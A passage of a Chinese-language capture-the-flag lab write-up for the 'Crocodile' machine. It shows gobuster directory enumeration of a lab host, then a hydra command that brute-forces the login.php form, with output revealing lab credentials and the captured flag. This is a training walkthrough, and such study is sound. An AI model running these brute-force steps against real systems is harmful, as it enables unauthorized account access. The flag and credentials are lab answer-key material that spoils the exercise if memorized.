+</span></span><span class="line"><span class="cl">by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span class="p">&amp;</span> Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Url:                     http://10.129.1.15
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Method:                  GET
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Threads:                 <span class="m">10</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Wordlist:                /usr/share/wordlists/dirb/common.txt
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Negative Status codes:   <span class="m">404</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> User Agent:              gobuster/3.8.2
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Extensions:              php
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Timeout:                 <span class="nv">10s</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl">Starting gobuster in directory enumeration <span class="nv">mode</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl">.hta                 <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 276<span class="o">]</span>
+</span></span><span class="line"><span class="cl">.hta.php             <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 276<span class="o">]</span>
+</span></span><span class="line"><span class="cl">.htaccess            <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 276<span class="o">]</span>
+</span></span><span class="line"><span class="cl">.htaccess.php        <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 276<span class="o">]</span>
+</span></span><span class="line"><span class="cl">.htpasswd            <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 276<span class="o">]</span>
+</span></span><span class="line"><span class="cl">.htpasswd.php        <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 276<span class="o">]</span>
+</span></span><span class="line"><span class="cl">assets               <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 311<span class="o">]</span> <span class="o">[</span>--&gt; http://10.129.1.15/assets/<span class="o">]</span>
+</span></span><span class="line"><span class="cl">config.php           <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 0<span class="o">]</span>
+</span></span><span class="line"><span class="cl">css                  <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 308<span class="o">]</span> <span class="o">[</span>--&gt; http://10.129.1.15/css/<span class="o">]</span>
+</span></span><span class="line"><span class="cl">dashboard            <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 314<span class="o">]</span> <span class="o">[</span>--&gt; http://10.129.1.15/dashboard/<span class="o">]</span>
+</span></span><span class="line"><span class="cl">fonts                <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 310<span class="o">]</span> <span class="o">[</span>--&gt; http://10.129.1.15/fonts/<span class="o">]</span>
+</span></span><span class="line"><span class="cl">index.html           <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 58565<span class="o">]</span>
+</span></span><span class="line"><span class="cl">js                   <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 307<span class="o">]</span> <span class="o">[</span>--&gt; http://10.129.1.15/js/<span class="o">]</span>
+</span></span><span class="line"><span class="cl">login.php            <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 1577<span class="o">]</span>
+</span></span><span class="line"><span class="cl">logout.php           <span class="o">(</span>Status: 302<span class="o">)</span> <span class="o">[</span>Size: 0<span class="o">]</span> <span class="o">[</span>--&gt; login.php<span class="o">]</span>
+</span></span><span class="line"><span class="cl">server-status        <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 276<span class="o">]</span>
+</span></span><span class="line"><span class="cl">Progress: <span class="m">9226</span> / <span class="m">9226</span> <span class="o">(</span>100.00%<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl"><span class="nv">Finished</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/6.-crocodile/assets/image-20261031144355055.png"
+	width="1112"
+	height="703"
+	srcset="/p/6.-crocodile/assets/image-20261031144355055_hu11246414318352775856.png 480w, /p/6.-crocodile/assets/image-20261031144355055_hu16475493498657042323.png 1024w"
+	loading="lazy"
+	
+		alt="image-20261031144355055"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="158"
+		data-flex-basis="379px"
+	
+></p>
+<p><strong>答案：login.php</strong></p>
+<h3 id="submit-single-flag">Submit Single Flag
+</h3><blockquote>
+<p>Submit the flag located in the webpage.</p>
+<p>提交网页上显示的旗帜。</p>
+</blockquote>
+<p>有账户名和密码字典可以尝试爆破，kali 上 burp 用着不适应，就选 <strong>hydra</strong> 进行爆破了。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# hydra -L allowed.userlist -P allowed.userlist.passwd 10.129.1.15 http-post-form <span class="s2">&#34;/login.php:Username=^USER^&amp;Password=^PASS^&amp;Submit=Login:F=Incorrect&#34;</span> -V
+</span></span><span class="line"><span class="cl">Hydra v9.7 <span class="o">(</span>c<span class="o">)</span> <span class="m">2023</span> by van Hauser/THC <span class="p">&amp;</span> David Maciejak - Please <span class="k">do</span> not use in military or secret service organizations, or <span class="k">for</span> illegal purposes <span class="o">(</span>this is non-binding, these *** ignore laws and ethics anyway<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Hydra <span class="o">(</span>https://github.com/vanhauser-thc/thc-hydra<span class="o">)</span> starting at 2026-10-31 02:48:16
+</span></span><span class="line"><span class="cl"><span class="o">[</span>WARNING<span class="o">]</span> Restorefile <span class="o">(</span>you have <span class="m">10</span> seconds to abort... <span class="o">(</span>use option -I to skip waiting<span class="o">))</span> from a previous session found, to prevent overwriting, ./hydra.restore
+</span></span><span class="line"><span class="cl"><span class="o">[</span>DATA<span class="o">]</span> max <span class="m">16</span> tasks per <span class="m">1</span> server, overall <span class="m">16</span> tasks, <span class="m">16</span> login tries <span class="o">(</span>l:4/p:4<span class="o">)</span>, ~1 try per task
+</span></span><span class="line"><span class="cl"><span class="o">[</span>DATA<span class="o">]</span> attacking http-post-form://10.129.1.15:80/login.php:Username<span class="o">=</span>^USER^<span class="p">&amp;</span><span class="nv">Password</span><span class="o">=</span>^PASS^<span class="p">&amp;</span><span class="nv">Submit</span><span class="o">=</span>Login:F<span class="o">=</span>Incorrect
+</span></span><span class="line"><span class="cl"><span class="o">[</span>ATTEMPT<span class="o">]</span> target 10.129.1.15 - login <span class="s2">&#34;aron&#34;</span> - pass <span class="s2">&#34;root&#34;</span> - <span class="m">1</span> of <span class="m">16</span> <span class="o">[</span>child 0<span class="o">]</span> <span class="o">(</span>0/0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>ATTEMPT<span class="o">]</span> target 10.129.1.15 - login <span class="s2">&#34;aron&#34;</span> - pass <span class="s2">&#34;Supersecretpassword1&#34;</span> - <span class="m">2</span> of <span class="m">16</span> <span class="o">[</span>child 1<span class="o">]</span> <span class="o">(</span>0/0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>ATTEMPT<span class="o">]</span> target 10.129.1.15 - login <span class="s2">&#34;aron&#34;</span> - pass <span class="s2">&#34;@BaASD&amp;9032123sADS&#34;</span> - <span class="m">3</span> of <span class="m">16</span> <span class="o">[</span>child 2<span class="o">]</span> <span class="o">(</span>0/0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>ATTEMPT<span class="o">]</span> target 10.129.1.15 - login <span class="s2">&#34;aron&#34;</span> - pass <span class="s2">&#34;rKXM59ESxesUFHAd&#34;</span> - <span class="m">4</span> of <span class="m">16</span> <span class="o">[</span>child 3<span class="o">]</span> <span class="o">(</span>0/0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>ATTEMPT<span class="o">]</span> target 10.129.1.15 - login <span class="s2">&#34;pwnmeow&#34;</span> - pass <span class="s2">&#34;root&#34;</span> - <span class="m">5</span> of <span class="m">16</span> <span class="o">[</span>child 4<span class="o">]</span> <span class="o">(</span>0/0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>ATTEMPT<span class="o">]</span> target 10.129.1.15 - login <span class="s2">&#34;pwnmeow&#34;</span> - pass <span class="s2">&#34;Supersecretpassword1&#34;</span> - <span class="m">6</span> of <span class="m">16</span> <span class="o">[</span>child 5<span class="o">]</span> <span class="o">(</span>0/0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>ATTEMPT<span class="o">]</span> target 10.129.1.15 - login <span class="s2">&#34;pwnmeow&#34;</span> - pass <span class="s2">&#34;@BaASD&amp;9032123sADS&#34;</span> - <span class="m">7</span> of <span class="m">16</span> <span class="o">[</span>child 6<span class="o">]</span> <span class="o">(</span>0/0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>ATTEMPT<span class="o">]</span> target 10.129.1.15 - login <span class="s2">&#34;pwnmeow&#34;</span> - pass <span class="s2">&#34;rKXM59ESxesUFHAd&#34;</span> - <span class="m">8</span> of <span class="m">16</span> <span class="o">[</span>child 7<span class="o">]</span> <span class="o">(</span>0/0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>ATTEMPT<span class="o">]</span> target 10.129.1.15 - login <span class="s2">&#34;egotisticalsw&#34;</span> - pass <span class="s2">&#34;root&#34;</span> - <span class="m">9</span> of <span class="m">16</span> <span class="o">[</span>child 8<span class="o">]</span> <span class="o">(</span>0/0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>ATTEMPT<span class="o">]</span> target 10.129.1.15 - login <span class="s2">&#34;egotisticalsw&#34;</span> - pass <span class="s2">&#34;Supersecretpassword1&#34;</span> - <span class="m">10</span> of <span class="m">16</span> <span class="o">[</span>child 9<span class="o">]</span> <span class="o">(</span>0/0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>ATTEMPT<span class="o">]</span> target 10.129.1.15 - login <span class="s2">&#34;egotisticalsw&#34;</span> - pass <span class="s2">&#34;@BaASD&amp;9032123sADS&#34;</span> - <span class="m">11</span> of <span class="m">16</span> <span class="o">[</span>child 10<span class="o">]</span> <span class="o">(</span>0/0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>ATTEMPT<span class="o">]</span> target 10.129.1.15 - login <span class="s2">&#34;egotisticalsw&#34;</span> - pass <span class="s2">&#34;rKXM59ESxesUFHAd&#34;</span> - <span class="m">12</span> of <span class="m">16</span> <span class="o">[</span>child 11<span class="o">]</span> <span class="o">(</span>0/0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>ATTEMPT<span class="o">]</span> target 10.129.1.15 - login <span class="s2">&#34;admin&#34;</span> - pass <span class="s2">&#34;root&#34;</span> - <span class="m">13</span> of <span class="m">16</span> <span class="o">[</span>child 12<span class="o">]</span> <span class="o">(</span>0/0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>ATTEMPT<span class="o">]</span> target 10.129.1.15 - login <span class="s2">&#34;admin&#34;</span> - pass <span class="s2">&#34;Supersecretpassword1&#34;</span> - <span class="m">14</span> of <span class="m">16</span> <span class="o">[</span>child 13<span class="o">]</span> <span class="o">(</span>0/0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>ATTEMPT<span class="o">]</span> target 10.129.1.15 - login <span class="s2">&#34;admin&#34;</span> - pass <span class="s2">&#34;@BaASD&amp;9032123sADS&#34;</span> - <span class="m">15</span> of <span class="m">16</span> <span class="o">[</span>child 14<span class="o">]</span> <span class="o">(</span>0/0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>ATTEMPT<span class="o">]</span> target 10.129.1.15 - login <span class="s2">&#34;admin&#34;</span> - pass <span class="s2">&#34;rKXM59ESxesUFHAd&#34;</span> - <span class="m">16</span> of <span class="m">16</span> <span class="o">[</span>child 15<span class="o">]</span> <span class="o">(</span>0/0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>80<span class="o">][</span>http-post-form<span class="o">]</span> host: 10.129.1.15   login: admin   password: rKXM59ESxesUFHAd
+</span></span><span class="line"><span class="cl"><span class="m">1</span> of <span class="m">1</span> target successfully completed, <span class="m">1</span> valid password found
+</span></span><span class="line"><span class="cl">Hydra <span class="o">(</span>https://github.com/vanhauser-thc/thc-hydra<span class="o">)</span> finished at 2026-10-31 02:48:30
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>-L</code> 指定用户名字典；<code>-P</code> 指定密码字典。</p>
+<p><code>http-post-form</code> 用于处理 HTTP POST 表单提交登录。</p>
+<p><code>&quot;/login.php:Username=^USER^&amp;Password=^PASS^&amp;Submit=Login:F=Incorrect&quot;</code> 即 <code>&quot;路径:POST参数:失败标记&quot;</code>；<code>^USER^</code> 和 <code>^PASS^</code> 是用户名和密码的占位符。</p>
+<p><code>-V</code> 打印每一次尝试。</p>
+<p>最后成功爆破出账密为 <code>admin:rKXM59ESxesUFHAd</code></p>
+<p><img src="/p/6.-crocodile/assets/image-20261031144912482.png"
+	width="1828"
+	height="382"
+	srcset="/p/6.-crocodile/assets/image-20261031144912482_hu15703088599211420470.png 480w, /p/6.-crocodile/assets/image-20261031144912482_hu13456106991391995850.png 1024w"
+	loading="lazy"
+	
+		alt="image-20261031144912482"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="478"
+		data-flex-basis="1148px"
+	
+></p>
+<p><strong>答案：c7110277ac44d78b6a9fff2232434d16</strong></p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/p/5.-appointment/">
+        
+        
+            <div class="article-image">
+                <img src="/p/5.-appointment/assets/image-20261030160424813.0eddbeb4be2b73e075784b4cba66f77b_hu6714861272316513708.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post 5. Appointment"
+                        
+                        data-hash="md5-Dt2&#43;tL4rc&#43;B1eEtMumb3ew==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">5. Appointment</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/4.-redeemer/">
+        
+        
+            <div class="article-image">
+                <img src="/p/4.-redeemer/assets/image-20261029141547603.308b338d8d465ef8d708c4d73627eac4_hu355029727915221381.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post 4. Redeemer"
+                        
+                        data-hash="md5-MIszjY1GXvjXCMTXNifqxA==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">4. Redeemer</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/3.-dancing/">
+        
+        
+            <div class="article-image">
+                <img src="/p/3.-dancing/assets/image-20261028145842689.5f13efdb57844034619b217cad3bd563_hu17452011367060013287.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post 3. Dancing"
+                        
+                        data-hash="md5-XxPv21eEQDRhmyF8rTvVYw==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">3. Dancing</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/2.-fawn/">
+        
+        
+            <div class="article-image">
+                <img src="/p/2.-fawn/assets/image-20261027140445868.773a8c373651890c1be942a87798f1d1_hu337560040496535759.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post 2. Fawn"
+                        
+                        data-hash="md5-dzqMNzZRiQwb6UKod5jx0Q==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">2. Fawn</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/1.-meow/">
+        
+        
+            <div class="article-image">
+                <img src="/p/1.-meow/Meow.122025366ccf02d46af5e8b27d41c5df_hu16383599966656616706.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post 1. Meow"
+                        
+                        data-hash="md5-EiAlNmzPAtRq9eiyfUHF3w==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">1. Meow</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2026 Sp1ke
+    </section>
+    
+    <section class="powerby">
+        
+            记录安全学习 <br/>
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.26.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
